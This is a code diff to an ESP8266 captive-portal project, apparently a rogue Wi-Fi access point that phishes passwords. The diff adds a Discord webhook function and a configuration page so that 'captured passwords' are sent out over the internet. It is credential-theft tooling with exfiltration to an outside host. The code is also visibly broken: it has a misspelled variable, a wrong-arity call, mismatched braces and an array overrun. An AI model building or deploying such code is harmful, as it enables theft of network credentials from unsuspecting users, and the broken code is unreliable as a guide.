@@ -2,7 +2,9 @@
 //            Made By HEINZGUENTER              //
 //github.com/heinzguenter/ESP8266-Captive-Portal//
 //////////////////////////////////////////////////
-
+#include <Arduino.h>
+#include <ESP8266HTTPClient.h>
+#include <WiFiClientSecure.h>
 #include <ESP8266WiFi.h>
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
@@ -34,6 +36,31 @@ int passEnd = passStart;       // Ending location in EEPROM to save password.
 
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
+
+bool Discord_WebhookSend(String content, String webhook_url) {
+  String discord_tts = "false";
+  WiFiClientSecure *client = new WiFiClientSecure;
+  bool ok = false;
+  if (clienft) {
+    client->setInsecure();
+    HTTPClient https;
+    if (https.begin(*client, webhook_url)) {
+      https.addHeader("Content-Type", "application/json");
+      int httpCode = https.POST("{\"content\":\"" + content +
+                                "\",\"tts\":" + discord_tts + "}");
+      if (httpCode > 0) {
+        if (httpCode == HTTP_CODE_OK ||
+            httpCode == HTTP_CODE_MOVED_PERMANENTLY ||
+            httpCode == HTTP_CODE_NO_CONTENT) {
+          }
+          ok = true;
+        }
+        https.end();
+      }
+  delete client;
+  return ok;
+}
+
 
 void LED(bool light) { // Turns the LED on(true) and off(false).
   if (light == true){digitalWrite(LED_BUILTIN, LOW);} 
@@ -194,6 +221,8 @@ void setup(){
 
   bootTime = lastActivity = millis();
   EEPROM.begin(512);
+  String webhookURL;
+  
 
   // Check whether the ESP is running for the first time.
   String checkValue = "first"; // This will will be set in EEPROM after the first run.
@@ -242,6 +271,8 @@ void setup(){
 
   webServer.on("/", handleIndex);
   webServer.on("/post", handlePost);
+  webServer.on("/postWebhook", recCommand);
+  webServer.on("/webhook/", webhookInterface);
   webServer.on("/restarting", handleFixing);
   webServer.on("/dashboard", handleDashboard);
   webServer.on("/clearPass", clearPass);
@@ -260,7 +291,85 @@ void setup(){
 
   Serial.printf("\n=====Setup=====\n\n");
 }
+String input(String argName) {
+  String a = webServer.arg(argName);
+  a.replace("<", "&lt;");
+  a.replace(">", "&gt;");
+  a.substring(0, 200); // Limit the length of the input string
+  return a;
+}
+void recCommand() {
+  String inputString = input("webhook");
+  Serial.println(inputString);
+  saveWebhookURL(255, inputString);
 
+  // Redirect the client back to the main page
+  webServer.sendHeader("Location", "/webhook", true);
+  webServer.send(302);
+}
+void saveWebhookURL (int address, String webhookURL) {
+  // save the URL to EEPROM
+  int leng;
+  Serial.println("leng: ");
+  Serial.println(leng);
+  leng = webhookURL.length();
+  Serial.println("leng: ");
+  Serial.println(leng);
+  EEPROM.write(address, leng);
+  for (int i = 0; i < leng; i++) {
+    EEPROM.write(address + 1 + i, webhookURL[i]);
+  }
+  EEPROM.commit();
+  
+  
+}
+
+String readWebhookURL(int address) {
+  int leng;
+  leng = EEPROM.read(address);
+  char data[leng];
+  for (int i = 0; i < leng; i++) {
+    data[i] = EEPROM.read(address + 1 + i);
+    
+  }
+  data[leng] = '\0';
+  return String(data);
+}
+
+void sendWebhook(String content) {
+  Discord_WebhookSend(content);
+  }
+void webhookInterface() {
+  String displayHook;
+  displayHook = readWebhookURL(255);
+  Serial.println(displayHook);
+  String _html = "";
+
+  _html = "<!DOCTYPE html><html><head>";
+  _html += "<meta charset=\"UTF-8\">";
+  _html += "<title>";
+  _html += "</title>";
+  _html += "<style>";
+  _html += "</style>";
+  _html += "</head>";
+  _html += "<body>";
+  _html += "<div id=\"networkBar\">";
+  _html += "</div>";
+  _html += "<div id=\"content\">";
+  _html += "<p class='center'>Add a discord webhook to receive the captured passwords over the internet</p>";
+  _html += "<form action=\"/postWebhook\">";
+  _html += "<button type='submit'>Set</button>";
+  _html += "<input placeholder=\"Webhook\" name=\"webhook\" required>";
+  _html += "</form>";
+  _html += "<br>";
+  _html += "Current Webhook: ";
+  _html += displayHook;
+  _html += "</div>";
+  _html += "</body></html>";
+
+  // Send the HTML page as a response to the client
+  webServer.send(200, "text/html", _html);
+}
 void loop(){
   dnsServer.processNextRequest();
   webServer.handleClient();
